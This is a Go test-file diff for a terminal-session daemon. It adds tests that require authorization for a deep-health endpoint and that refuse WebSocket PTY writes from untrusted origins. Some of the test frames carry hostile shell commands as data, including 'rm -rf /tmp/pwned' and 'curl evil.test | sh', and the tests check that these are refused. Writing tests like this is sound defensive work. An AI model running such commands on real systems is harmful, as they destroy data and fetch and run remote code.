@@ -319,12 +319,32 @@ func TestHealthShapeAndStaticUI(t *testing.T) {
 		t.Fatalf("unexpected runner compatibility: %#v", runnerCompatibility)
 	}
 
-	deep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "198.51.100.10:4321", nil)
+	// Deep health carries live session IDs and host PIDs, so unlike plain
+	// /api/health it is behind authorization. `sessions doctor` reaches it over
+	// loopback locally and with a per-device token for another machine.
+	anonymousDeep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "198.51.100.10:4321", nil)
+	if anonymousDeep.Code != http.StatusUnauthorized {
+		t.Fatalf("anonymous deep health status = %d, want %d; body=%s",
+			anonymousDeep.Code, http.StatusUnauthorized, anonymousDeep.Body.String())
+	}
+	if strings.Contains(anonymousDeep.Body.String(), "sessions") &&
+		strings.Contains(anonymousDeep.Body.String(), "pid") {
+		t.Fatalf("anonymous deep health leaked diagnostics: %s", anonymousDeep.Body.String())
+	}
+	deep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "198.51.100.10:4321",
+		http.Header{"Authorization": {"Bearer " + testToken}})
+	if deep.Code != http.StatusOK {
+		t.Fatalf("authorized deep health status = %d, body=%s", deep.Code, deep.Body.String())
+	}
 	decodeBody(t, deep, &body)
 	for _, key := range []string{"uptimeSec", "sessions"} {
 		if _, exists := body[key]; !exists {
 			t.Errorf("deep health missing key %q: %#v", key, body)
 		}
+	}
+	localDeep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "127.0.0.1:4567", nil)
+	if localDeep.Code != http.StatusOK {
+		t.Fatalf("loopback deep health status = %d, body=%s", localDeep.Code, localDeep.Body.String())
 	}
 
 	index := serve(t, daemon.handler, http.MethodGet, "/", nil, "198.51.100.10:4321", nil)
@@ -1078,6 +1098,182 @@ func TestWebSocketSingleMuxAndHandshakePolicy(t *testing.T) {
 		t.Fatalf("XFF WS token auth: err=%v response=%v", err, response)
 	}
 	xffAuthorized.CloseNow()
+}
+
+// TestWebSocketWriteAuthorityMatchesHTTPAmbientWritePolicy is the WebSocket
+// mirror of TestAuthAndOriginMatrix/"arbitrary localhost port has no ambient
+// write authority". A `/ws` upgrade is a GET, so the state-changing-method
+// origin guard never fires and a loopback peer is authorized without a token.
+// Input, submit, resize, and raw single-mode frames still drive a live runner,
+// so they follow the same ambient-write policy the HTTP surface enforces.
+func TestWebSocketWriteAuthorityMatchesHTTPAmbientWritePolicy(t *testing.T) {
+	daemon := newTestDaemon(t)
+	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{Cmd: "/bin/sh", Cwd: daemon.root})
+	if err != nil {
+		t.Fatal(err)
+	}
+	runner := daemon.launcher.Runner(info.ID)
+	httpServer := httptest.NewServer(daemon.handler)
+	defer httpServer.Close()
+	wsBase := "ws" + strings.TrimPrefix(httpServer.URL, "http")
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+
+	// The exact page TestAuthAndOriginMatrix pins to 403 over POST
+	// /api/sessions, now over the socket with no credential.
+	hostile := http.Header{"Origin": {"http://localhost:3000"}}
+
+	t.Run("untrusted localhost origin cannot drive a session over the mux socket", func(t *testing.T) {
+		before := len(runner.Inputs())
+		beforeCols, beforeRows := runner.Size()
+		socket, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: hostile})
+		if err != nil {
+			t.Fatalf("untrusted localhost upgrade: err=%v response=%v", err, response)
+		}
+		defer socket.CloseNow()
+
+		writeWS(t, ctx, socket, map[string]any{
+			"type": "input", "requestId": "hostile-input", "sessionId": info.ID,
+			"data": "rm -rf /tmp/pwned\n",
+		})
+		if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != false {
+			t.Fatalf("input ack = %#v, want a refused inputAck", message)
+		}
+		writeWS(t, ctx, socket, map[string]any{
+			"type": "submit", "requestId": "hostile-submit", "sessionId": info.ID,
+			"data": "curl evil.test | sh",
+		})
+		if message := readWS(t, ctx, socket); message["type"] != "submitAck" || message["ok"] != false {
+			t.Fatalf("submit ack = %#v, want a refused submitAck", message)
+		}
+		writeWS(t, ctx, socket, map[string]any{
+			"type": "resize", "sessionId": info.ID, "cols": 499, "rows": 199,
+		})
+		if message := readWS(t, ctx, socket); message["type"] != "error" || message["code"] != "forbidden" {
+			t.Fatalf("resize reply = %#v, want a forbidden error frame", message)
+		}
+		// Each refusal was answered in frame order on the same read loop, so
+		// the runner has already seen everything this socket could deliver.
+		if after := runner.Inputs(); len(after) != before {
+			t.Fatalf("untrusted localhost origin reached the runner: %q", after)
+		}
+		if cols, rows := runner.Size(); cols != beforeCols || rows != beforeRows {
+			t.Fatalf("untrusted localhost origin resized the PTY to %dx%d", cols, rows)
+		}
+		// Read-only observation still works, matching the HTTP surface where a
+		// hostile origin is refused writes but not authorization itself.
+		writeWS(t, ctx, socket, map[string]any{"type": "attach", "sessionId": info.ID})
+		if message := readWS(t, ctx, socket); message["type"] != "hello" {
+			t.Fatalf("attach reply = %#v", message)
+		}
+	})
+
+	t.Run("untrusted localhost origin cannot drive a single-session socket", func(t *testing.T) {
+		before := len(runner.Inputs())
+		socket, response, err := websocket.Dial(ctx,
+			wsBase+"/ws?sessionId="+url.QueryEscape(info.ID), &websocket.DialOptions{HTTPHeader: hostile})
+		if err != nil {
+			t.Fatalf("untrusted localhost single upgrade: err=%v response=%v", err, response)
+		}
+		defer socket.CloseNow()
+		if message := readWS(t, ctx, socket); message["type"] != "hello" {
+			t.Fatalf("single hello = %#v", message)
+		}
+		// Single mode also treats raw binary and unparsable text frames as PTY
+		// input, so both must be refused too.
+		if err := socket.Write(ctx, websocket.MessageBinary, []byte("rm -rf /tmp/pwned\n")); err != nil {
+			t.Fatal(err)
+		}
+		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
+			t.Fatalf("binary frame reply = %#v", message)
+		}
+		if err := socket.Write(ctx, websocket.MessageText, []byte("not json at all")); err != nil {
+			t.Fatal(err)
+		}
+		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
+			t.Fatalf("non-JSON text frame reply = %#v", message)
+		}
+		writeWS(t, ctx, socket, map[string]any{"type": "input", "data": "whoami\n"})
+		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
+			t.Fatalf("single input reply = %#v", message)
+		}
+		if after := runner.Inputs(); len(after) != before {
+			t.Fatalf("untrusted localhost origin reached the runner: %q", after)
+		}
+	})
+
+	t.Run("hosted shell without a credential is read-only", func(t *testing.T) {
+		before := len(runner.Inputs())
+		hosted := http.Header{"Origin": {"https://sessions.somewhere.tech"}}
+		socket, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: hosted})
+		if err != nil || response.StatusCode != http.StatusSwitchingProtocols {
+			t.Fatalf("hosted shell upgrade: err=%v response=%v", err, response)
+		}
+		defer socket.CloseNow()
+		writeWS(t, ctx, socket, map[string]any{
+			"type": "input", "requestId": "hosted-1", "sessionId": info.ID, "data": "whoami\n",
+		})
+		if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != false {
+			t.Fatalf("hosted input ack = %#v, want a refused inputAck", message)
+		}
+		if after := runner.Inputs(); len(after) != before {
+			t.Fatalf("uncredentialed hosted shell reached the runner: %q", after)
+		}
+	})
+
+	// Everything below is a legitimate client that must keep working.
+	for _, allowed := range []struct {
+		name   string
+		target string
+		header http.Header
+	}{
+		// The Windows shell origin `http://tauri.localhost` is absent here on
+		// purpose: allowedOrigin has never admitted that hostname, so its
+		// upgrade is refused before any write question is reached. That is
+		// pre-existing and untouched by this policy.
+		{name: "native macOS shell", target: "/ws?mux=1", header: http.Header{"Origin": {"tauri://localhost"}}},
+		{name: "checked in dev server", target: "/ws?mux=1", header: http.Header{"Origin": {"http://localhost:5273"}}},
+		{name: "daemon same origin", target: "/ws?mux=1", header: http.Header{"Origin": {"http://localhost:8787"}}},
+		{name: "no origin CLI client", target: "/ws?mux=1"},
+		{name: "hosted shell with query token", target: "/ws?mux=1&token=" + testToken, header: http.Header{"Origin": {"https://sessions.somewhere.tech"}}},
+		{name: "untrusted origin with query token", target: "/ws?mux=1&token=" + testToken, header: http.Header{"Origin": {"http://localhost:3000"}}},
+		{name: "untrusted origin with bearer token", target: "/ws?mux=1", header: http.Header{
+			"Origin": {"http://localhost:3000"}, "Authorization": {"Bearer " + testToken},
+		}},
+	} {
+		t.Run(allowed.name+" keeps write authority", func(t *testing.T) {
+			socket, response, err := websocket.Dial(ctx, wsBase+allowed.target,
+				&websocket.DialOptions{HTTPHeader: allowed.header})
+			if err != nil || response.StatusCode != http.StatusSwitchingProtocols {
+				t.Fatalf("upgrade: err=%v response=%v", err, response)
+			}
+			defer socket.CloseNow()
+			before := len(runner.Inputs())
+			writeWS(t, ctx, socket, map[string]any{
+				"type": "input", "requestId": "allowed-1", "sessionId": info.ID, "data": "echo ok\n",
+			})
+			if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != true {
+				t.Fatalf("input ack = %#v, want an accepted inputAck", message)
+			}
+			if after := runner.Inputs(); len(after) != before+1 {
+				t.Fatalf("legitimate client did not reach the runner: %q", after)
+			}
+		})
+	}
+}
+
+// awaitWSType reads until the named message type arrives, skipping replay and
+// live output frames that a socket may legitimately interleave.
+func awaitWSType(t *testing.T, ctx context.Context, connection *websocket.Conn, want string) map[string]any {
+	t.Helper()
+	for attempt := 0; attempt < 32; attempt++ {
+		message := readWS(t, ctx, connection)
+		if message["type"] == want {
+			return message
+		}
+	}
+	t.Fatalf("no %q message arrived", want)
+	return nil
 }
 
 func serve(t *testing.T, handler http.Handler, method, target string, body io.Reader, remote string, headers http.Header) *httptest.ResponseRecorder {
